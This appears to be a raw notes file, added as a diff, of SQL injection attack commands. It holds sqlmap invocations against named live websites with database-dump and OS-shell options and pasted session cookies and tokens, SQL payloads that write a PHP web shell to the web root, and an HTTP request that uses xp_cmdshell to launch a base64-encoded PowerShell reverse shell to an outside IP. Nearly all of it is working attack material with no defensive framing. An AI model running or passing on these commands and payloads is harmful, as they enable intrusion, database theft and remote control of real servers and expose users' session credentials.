+sqlmap -u https://portal1.liquidcapital.co.za/leadservice/LeadgeneratorSvc.asmx?op=SaveXmlLeadData -p OP  --dbms=mssql --os-shell
+https://customer.com/php/load.php?page=' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?>’ -- -
+SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “/var/www/html/cmd.php”
+
+sqlmap -u "https://mydash-staging-api.braveocean-9b6f0f5d.southafricanorth.azurecontainerapps.io/api/admin/v1/administrators/*8" --method=PUT --dbs --dbms=mysql 
+
+
+SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “/var/www/html/cmd.php” 
+Normal'+UNION+SELECT+(<?php echo exec($_GET["cmd"]);)+INTO+OUTFILE+'/srv/http/cmd.php'%3b+--+
+Normal'+UNION+SELECT+%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22+INTO+OUTFILE+%27/srv/http/cmd.php%27%3b+--+ 
+
+
+
+
+sqlmap.py -u “https://dev.motusselect.co.za/cars/used/brand/toyota/model/avanza?search=toyota” --batch --banner
+
+sqlmap -u "[REDACTED]" --dbms=PostgreSQL --random-agent --dump-all --no-cast
+
+
+
+sqlmap --url 'https://www.citigroup.com/rcs/citigpa/akpublic/storage/public/Global-ESG-Report-2019.pdf' --random-agent --no-cast --cookie='session=BFXYofKVTpQU5UChgMqoVBPmeX3xcuCU; _lab=46%7cMCwCFDaYKDPcR1Md7rZv%2f%2bllf8lcpzFHAhRcIznlk8mtHYODUIGNI4EM%2bJ6xdv9r2McXj5LFzhqtm8sSlTwjrWyGFTy9nUW2YOvFblguqV17pSLFvI5sbWiJOws6F8GDR1NtQemgoQon7dWeR4byy7KTDkrDHQ22N6xD1hYmSGPqzw8%3d'
+sqlmap --url 'https://0a8d004703e211f381f8166a002e0066.web-security-academy.net/filtered_search?find=jjj&organize=4&order=DESC&BlogArtist=Sophie+Mail' --random-agent --dump --no-cast --cookie='session=XGUFLNH3gnchRrHPrm1EWRyTOVFAh8f3; _lab=46%7cMCwCFBQec59%2fyytWqfubpwTfWba3JL7dAhQkMeyvMOwRYMs4o7wNLbXSmD1sHRQR8zPkjPUBl%2f%2fA69oEVmkjMe45uYiDvS%2fMp8xoTPkkPQk93ORFyJHeljrk%2b4JKViH3%2fC1No89Lmb%2bvMILaew04F3ziKJqSGnqFm5YpTdI3pB5sCNo%3d' -D public -T users --dbs --dbms=postgresql
+sqlmap --url 'https://0a6a0040034fd6c2802317a200cb00ba.web-security-academy.net/filtered_search?find=test&organize=3&order=DESC&BlogArtist=Roger+That' --cookie='_lab=46%7cMCwCFHdo5f7l%2blGIev41dMbIL25DknD5AhQFH2KATBNhF%2bpoj8BzJI%2bMIfzZcslqC1VJCWlXIH40F4VwUlWbCqjgH%2fsDy1pGvdvMwmIAm5GL%2ba%2fbB%2fHKk6U14OyqNOLFHuMhNE68%2foKcLDt2I2CsFmm1jCtxzxZxisvhq%2bmPw3sHOOg%3d; session=i7G08I7dBcPwkaHJXhw14BZaHPJcwRdq' --dbs --dbms=postgresql --level=5 --risk=3 --random-agent -D public -T users
+sqlmap --url  https://www.coinitrewards.co.za/admin/correspondence/18*" --dbms=PostgreSQL --proxy=http://127.0.0.1:8080 --random-agent --dump-all --no-cast --cookie="XSRF-TOKEN=eyJpdiI6IkpFaFN6RmpOOE1pWW5NZEl5dFdBdUE9PSIsInZhbHVlIjoidkhzZmgrMVB0ZDBcLytnVkNTMU1uazUxYU5EZjRUV2tGWkRNeU01cEsxSHQzN0JlcGFwSHoweXRobDRETURCd1BsSW5nVjczRVRreGJQa0hwR1o3Q3pRPT0iLCJtYWMiOiIwMDgyMDMxNjE3NTYyZjc1NzIxNWIxMTgyM2M3NGJiYzkyZDBlYTMyYjQ5NzYyZWFlYzEwODMyNzc0NmU2YmYzIn0%3D; laravel_session=eyJpdiI6Im9wRDVrVVwvVWJOSXlKOEZIUElUZmpBPT0iLCJ2YWx1ZSI6IlBTQmI4ZElxbTgrU0hGYVZFcUhVeWNNQ01GRTJ1N3o4Y0cwWDJqUVpoZkEwR0xXcll0NFVzY25haDQ2UEdwMlVub3VDTDdCV2J4SjBtR3JDUTQxVGVBPT0iLCJtYWMiOiIxYzY1OTRhZmRhY2NiNzMwOWFhODU0MTJmNTUyNjdhNDg2ODhiMmMzMmJmZGQ2Y2NlZmM3NzUxODIxYWJmOWQ2In0%3D 
+
+sqlmap --url 'https://www.vueling.com/en/vueling-services/supplementary-service-rates?Currency=USD' --dbms= --proxy=http://127.0.0.1:8080 --random-agent --dump-all --no-cast --cookie="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjM1Mzk0ODUiLCJUVEwiOiIxNzk5OTk5Ljk5NDUiLCJleHAiOjE3MjExMjYxNTIsImlzcyI6IlZlbG9jaXR5X3VhdCIsImF1ZCI6IkV4dEFwaSJ9.oZg61KV2Mlrg2340VL_vY7CcmYnLxZ2afa0jKFxfric"
+
+
+
+This is the payload for the reverse shell:
+ 
+GET /SuperUser/OrderReport?SupplierId=26&StoreID=63&Region='%3b%20EXEC%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwA0AC4AMgAwADcALgAyADMANwAuADIAMQA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2bACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3d'--&PartId=0&start=1%20January,%202025&end=16%20January,%202025 HTTP/2
+Host: napa.stannumtech.co.za
+Cookie: __RequestVerificationToken=wxQk6haxu8PM27op15C0SFP3fYQvQFSNGGOO0DHzZw_wQsiLHWYNQp6DSj-p-nVWEVkdtbI1UXP-6eTYUo9WY3iy_9vsKz_MlWIRFf48yJo1; .ASPXAUTH=973854A26047C7F6B49706068CFFE170E5CB3098C30BE79412DF58E3761B208698AD017FF7885108ECE659FD0916E2D4099C02A12CADC4B362D593D75D58B049DC102FF95A4B5E6CF617792EA1703F8993484EE5FC989112DEB2DFA95F5CE9C9
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://napa.stannumtech.co.za/SuperUser/OrderReport
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+base64 decode
+- JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwA0AC4AMgAwADcALgAyADMANwAuADIAMQA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2bACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2bACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAq
